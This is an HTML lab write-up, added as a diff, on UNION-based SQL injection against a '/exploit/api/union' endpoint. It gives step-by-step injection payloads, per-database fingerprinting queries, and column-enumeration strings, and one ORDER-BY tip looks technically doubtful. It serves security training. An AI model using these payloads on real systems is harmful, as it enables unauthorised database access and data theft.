@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab 8.3.2 — UNION-Based SQLi Summary</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0d0f12;
+    --bg2: #13161b;
+    --bg3: #1a1e25;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #c9cdd6;
+    --text2: #7a8194;
+    --text3: #4a5068;
+    --accent: #4ade80;
+    --accent2: #22d3ee;
+    --warn: #fbbf24;
+    --danger: #f87171;
+    --purple: #a78bfa;
+    --orange: #fb923c;
+    --blue: #3b82f6;
+    --font: 'IBM Plex Sans', sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 14px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 32px 32px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 48px 24px 80px;
+  }
+
+  /* Header */
+  header {
+    margin-bottom: 40px;
+    padding-bottom: 28px;
+    border-bottom: 1px solid var(--border);
+  }
+  .lab-tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(74,222,128,0.08);
+    border: 1px solid rgba(74,222,128,0.2);
+    padding: 3px 10px;
+    border-radius: 4px;
+    margin-bottom: 12px;
+    letter-spacing: .05em;
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 600;
+    color: #e8eaf0;
+    letter-spacing: -0.02em;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    font-size: 13px;
+    color: var(--text2);
+  }
+  .answer-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 16px;
+    background: rgba(74,222,128,0.08);
+    border: 1px solid rgba(74,222,128,0.25);
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-size: 14px;
+    color: var(--accent);
+  }
+  .answer-badge strong { font-size: 16px; }
+
+  /* Section headers */
+  h2 {
+    font-size: 16px;
+    font-weight: 600;
+    color: #e8eaf0;
+    margin: 36px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  h2 .num {
+    width: 24px; height: 24px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px;
+    font-family: var(--mono);
+    color: var(--text2);
+    flex-shrink: 0;
+  }
+
+  h3 {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: .07em;
+    margin: 20px 0 10px;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 12px;
+    font-size: 14px;
+  }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+  .code-lang {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: .08em;
+  }
+  .copy-btn {
+    font-family: var(--font);
+    font-size: 10px;
+    color: var(--text3);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 2px 8px;
+    cursor: pointer;
+    transition: color .15s, border-color .15s;
+  }
+  .copy-btn:hover { color: var(--text2); border-color: var(--border2); }
+  .copy-btn.copied { color: var(--accent); border-color: rgba(74,222,128,0.3); }
+  pre {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent2);
+    padding: 14px 16px;
+    overflow-x: auto;
+    line-height: 1.8;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  pre .comment { color: var(--text3); }
+  pre .keyword { color: var(--purple); }
+  pre .string { color: var(--accent); }
+  pre .fn { color: var(--warn); }
+
+  /* Inline code */
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 4px;
+    color: var(--accent2);
+  }
+
+  /* Result table */
+  .result-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+    margin-bottom: 16px;
+  }
+  .result-table th {
+    text-align: left;
+    padding: 9px 12px;
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--text2);
+    border-bottom: 1px solid var(--border2);
+    background: var(--bg2);
+  }
+  .result-table td {
+    padding: 9px 12px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: middle;
+  }
+  .result-table tr:last-child td { border-bottom: none; }
+  .result-table td code { font-size: 11px; }
+  .result-table td:first-child { color: var(--text2); }
+
+  .badge-ok {
+    display: inline-flex; align-items: center; gap: 4px;
+    background: rgba(74,222,128,0.1);
+    color: var(--accent);
+    border: 1px solid rgba(74,222,128,0.2);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-size: 11px;
+    font-family: var(--mono);
+  }
+  .badge-err {
+    display: inline-flex; align-items: center; gap: 4px;
+    background: rgba(248,113,113,0.1);
+    color: var(--danger);
+    border: 1px solid rgba(248,113,113,0.2);
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-size: 11px;
+    font-family: var(--mono);
+  }
+
+  /* Tip box */
+  .tip {
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.15);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--text2);
+    margin-bottom: 16px;
+    line-height: 1.7;
+  }
+  .tip strong { color: #e8eaf0; }
+
+  /* DB cards */
+  .db-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  @media(max-width:600px){ .db-grid { grid-template-columns: 1fr; } }
+
+  .db-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+  }
+  .db-card-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+  }
+  .db-dot {
+    width: 9px; height: 9px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .mysql .db-dot { background: var(--accent); box-shadow: 0 0 5px var(--accent); }
+  .mssql .db-dot { background: var(--blue); box-shadow: 0 0 5px var(--blue); }
+  .pgsql .db-dot { background: var(--purple); box-shadow: 0 0 5px var(--purple); }
+  .oracle .db-dot { background: var(--orange); box-shadow: 0 0 5px var(--orange); }
+
+  .db-card-name {
+    font-size: 13px;
+    font-weight: 500;
+    color: #e8eaf0;
+    flex: 1;
+  }
+  .db-card pre {
+    font-size: 11px;
+    padding: 10px 14px;
+    background: transparent;
+    border: none;
+  }
+  .db-verdict {
+    padding: 6px 14px 10px;
+  }
+
+  /* Ref table */
+  .ref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin-bottom: 16px;
+    background: var(--bg2);
+    border-radius: 8px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .ref-table th {
+    text-align: left;
+    padding: 9px 12px;
+    font-weight: 500;
+    font-size: 11px;
+    border-bottom: 1px solid var(--border2);
+    background: var(--bg3);
+  }
+  .ref-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+  }
+  .ref-table tr:last-child td { border-bottom: none; }
+  .ref-table td:first-child { color: var(--text); font-weight: 500; }
+  .ref-table td code { font-size: 11px; }
+  .th-mysql { color: var(--accent); }
+  .th-mssql { color: var(--blue); }
+  .th-pgsql { color: var(--purple); }
+  .th-oracle { color: var(--orange); }
+
+  /* Steps */
+  .step {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 20px;
+  }
+  .step-num {
+    width: 28px; height: 28px;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px;
+    font-family: var(--mono);
+    color: var(--text2);
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .step-body { flex: 1; }
+  .step-title {
+    font-size: 14px;
+    font-weight: 500;
+    color: #e8eaf0;
+    margin-bottom: 8px;
+  }
+
+  footer {
+    text-align: center;
+    font-size: 11px;
+    color: var(--text3);
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <header>
+    <div class="lab-tag">LAB 8.3.2 — UNION-Based Payloads</div>
+    <h1>Identifying the Database Type</h1>
+    <div class="subtitle">Endpoint: <code>POST /exploit/api/union</code> &nbsp;·&nbsp; Parameters: <code>name</code>, <code>sort</code>, <code>order</code></div>
+    <div class="answer-badge">
+      <span>✅ Answer:</span>
+      <strong>MySQL</strong>
+    </div>
+  </header>
+
+  <!-- Step 1 -->
+  <h2><span class="num">1</span> Establish a Baseline</h2>
+  <p>Sending a blank <code>name</code> parameter returned all products with 4 columns: <code>id</code>, <code>name</code>, <code>description</code>, <code>price</code>. This revealed the underlying query structure:</p>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL (inferred)</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>SELECT id, name, description, price FROM products
+WHERE name LIKE '%%'
+ORDER BY id ASC</pre>
+  </div>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">Baseline request</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>name=&sort=id&order=asc</pre>
+  </div>
+
+  <!-- Step 2 -->
+  <h2><span class="num">2</span> Find the Injection Point</h2>
+  <p>Each parameter was tested with a subquery to see which one accepted it without erroring:</p>
+
+  <div class="step">
+    <div class="step-num">→</div>
+    <div class="step-body">
+      <div class="step-title">Testing <code>order</code> parameter</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">payload</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>name=&sort=id&order=asc,(SELECT NULL)-- -</pre>
+      </div>
+      <p>Returned <code style="color:var(--accent)">200 OK</code> with all products — confirmed <strong style="color:#e8eaf0">order is injectable</strong>.</p>
+    </div>
+  </div>
+
+  <!-- Step 3 -->
+  <h2><span class="num">3</span> Rule Out Each Database Type</h2>
+  <p>DB-specific syntax was injected one at a time. A <code style="color:var(--accent)">200</code> means the function exists; a <code style="color:var(--danger)">500</code> means it doesn't.</p>
+
+  <table class="result-table">
+    <tr>
+      <th>Database</th>
+      <th>Payload</th>
+      <th>Result</th>
+      <th>Conclusion</th>
+    </tr>
+    <tr>
+      <td>MSSQL / MySQL</td>
+      <td><code>order=asc,(SELECT @@version)-- -</code></td>
+      <td><span class="badge-ok">✓ 200</span></td>
+      <td>Could be either</td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td><code>order=asc,(SELECT version())-- -</code></td>
+      <td><span class="badge-ok">✓ 200</span></td>
+      <td>Still ambiguous</td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td><code>order=asc,(SELECT banner FROM v$version WHERE rownum=1)-- -</code></td>
+      <td><span class="badge-err">✗ 500</span></td>
+      <td>❌ Ruled out</td>
+    </tr>
+    <tr>
+      <td>MSSQL</td>
+      <td><code>order=asc,(SELECT GETDATE())-- -</code></td>
+      <td><span class="badge-err">✗ 500</span></td>
+      <td>❌ Ruled out</td>
+    </tr>
+    <tr>
+      <td>MySQL</td>
+      <td><code>order=asc,(SELECT sleep(0))-- -</code></td>
+      <td><span class="badge-ok">✓ 200</span></td>
+      <td>✅ Confirmed MySQL</td>
+    </tr>
+  </table>
+
+  <div class="tip">
+    <strong>Key insight:</strong> <code>sleep()</code> is MySQL-exclusive. MSSQL uses <code>WAITFOR DELAY</code>, PostgreSQL uses <code>pg_sleep()</code>, and Oracle uses <code>dbms_lock.sleep()</code>. A 200 response on <code>sleep(0)</code> is a definitive MySQL fingerprint.
+  </div>
+
+  <!-- DB Fingerprinting Reference -->
+  <h2><span class="num">4</span> DB Fingerprinting Reference</h2>
+  <p>Use these payloads in future labs to identify the database. Inject into the vulnerable parameter and watch for 200 vs 500.</p>
+
+  <div class="db-grid">
+    <!-- MySQL -->
+    <div class="db-card mysql">
+      <div class="db-card-header">
+        <div class="db-dot"></div>
+        <span class="db-card-name">MySQL</span>
+      </div>
+      <div class="code-block" style="margin:10px;border-radius:6px">
+        <div class="code-header"><span class="code-lang">fingerprint</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>(SELECT sleep(0))
+(SELECT benchmark(0,0))</pre>
+      </div>
+      <div class="db-verdict"><span class="badge-ok">✓ 200 = MySQL</span></div>
+    </div>
+
+    <!-- MSSQL -->
+    <div class="db-card mssql">
+      <div class="db-card-header">
+        <div class="db-dot"></div>
+        <span class="db-card-name">MSSQL</span>
+      </div>
+      <div class="code-block" style="margin:10px;border-radius:6px">
+        <div class="code-header"><span class="code-lang">fingerprint</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>(SELECT GETDATE())
+(SELECT @@SERVERNAME)</pre>
+      </div>
+      <div class="db-verdict"><span class="badge-ok">✓ 200 = MSSQL</span></div>
+    </div>
+
+    <!-- PostgreSQL -->
+    <div class="db-card pgsql">
+      <div class="db-card-header">
+        <div class="db-dot"></div>
+        <span class="db-card-name">PostgreSQL</span>
+      </div>
+      <div class="code-block" style="margin:10px;border-radius:6px">
+        <div class="code-header"><span class="code-lang">fingerprint</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>(SELECT current_date)
+(SELECT 1::text)</pre>
+      </div>
+      <div class="db-verdict"><span class="badge-ok">✓ 200 = PostgreSQL</span></div>
+    </div>
+
+    <!-- Oracle -->
+    <div class="db-card oracle">
+      <div class="db-card-header">
+        <div class="db-dot"></div>
+        <span class="db-card-name">Oracle</span>
+      </div>
+      <div class="code-block" style="margin:10px;border-radius:6px">
+        <div class="code-header"><span class="code-lang">fingerprint</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+        <pre>(SELECT NULL FROM dual)
+(SELECT banner FROM v$version WHERE rownum=1)</pre>
+      </div>
+      <div class="db-verdict"><span class="badge-ok">✓ 200 = Oracle</span></div>
+    </div>
+  </div>
+
+  <!-- General Tips -->
+  <h2><span class="num">5</span> General UNION Injection Tips</h2>
+
+  <h3>Find column count — WHERE clause injection</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -   ← when this errors, column count = 2</pre>
+  </div>
+
+  <h3>Find column count — ORDER BY injection</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>order=asc UNION SELECT NULL-- -
+order=asc UNION SELECT NULL,NULL-- -
+order=asc UNION SELECT NULL,NULL,NULL-- -   ← keep going until 200</pre>
+  </div>
+
+  <h3>Find string columns</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copy(this)">copy</button></div>
+    <pre>' UNION SELECT 'a',NULL,NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL,NULL-- -
+' UNION SELECT NULL,NULL,'a',NULL-- -   ← whichever returns 200 = string column</pre>
+  </div>
+
+  <!-- Quick ref table -->
+  <h2><span class="num">6</span> Syntax Differences by DB</h2>
+
+  <table class="ref-table">
+    <tr>
+      <th>Feature</th>
+      <th class="th-mysql">MySQL</th>
+      <th class="th-mssql">MSSQL</th>
+      <th class="th-pgsql">PostgreSQL</th>
+      <th class="th-oracle">Oracle</th>
+    </tr>
+    <tr>
+      <td>Version</td>
+      <td><code>@@version</code></td>
+      <td><code>@@version</code></td>
+      <td><code>version()</code></td>
+      <td><code>v$version</code></td>
+    </tr>
+    <tr>
+      <td>Sleep</td>
+      <td><code>sleep(0)</code></td>
+      <td><code>WAITFOR DELAY '0:0:0'</code></td>
+      <td><code>pg_sleep(0)</code></td>
+      <td><code>dbms_lock.sleep(0)</code></td>
+    </tr>
+    <tr>
+      <td>Date</td>
+      <td><code>NOW()</code></td>
+      <td><code>GETDATE()</code></td>
+      <td><code>current_date</code></td>
+      <td><code>SYSDATE</code></td>
+    </tr>
+    <tr>
+      <td>Concat</td>
+      <td><code>concat(a,b)</code></td>
+      <td><code>a+b</code></td>
+      <td><code>a||b</code></td>
+      <td><code>a||b</code></td>
+    </tr>
+    <tr>
+      <td>First row</td>
+      <td><code>LIMIT 0,1</code></td>
+      <td><code>TOP 1</code></td>
+      <td><code>LIMIT 1</code></td>
+      <td><code>rownum=1</code></td>
+    </tr>
+    <tr>
+      <td>Tables meta</td>
+      <td><code>information_schema</code></td>
+      <td><code>information_schema</code></td>
+      <td><code>information_schema</code></td>
+      <td><code>all_tables</code></td>
+    </tr>
+    <tr>
+      <td>Requires FROM</td>
+      <td>No</td>
+      <td>No</td>
+      <td>No</td>
+      <td><strong>Yes</strong> (FROM dual)</td>
+    </tr>
+    <tr>
+      <td>Comment</td>
+      <td><code>-- -</code> or <code>#</code></td>
+      <td><code>--</code> or <code>/**/</code></td>
+      <td><code>--</code></td>
+      <td><code>--</code></td>
+    </tr>
+  </table>
+
+  <footer>
+    Lab 8.3.2 — UNION-Based SQL Injection &nbsp;·&nbsp; For authorized CTF / lab use only
+  </footer>
+
+</div>
+
+<script>
+function copy(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  const text = pre.innerText.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'copy';
+      btn.classList.remove('copied');
+    }, 1500);
+  });
+}
+</script>
+</body>
+</html>
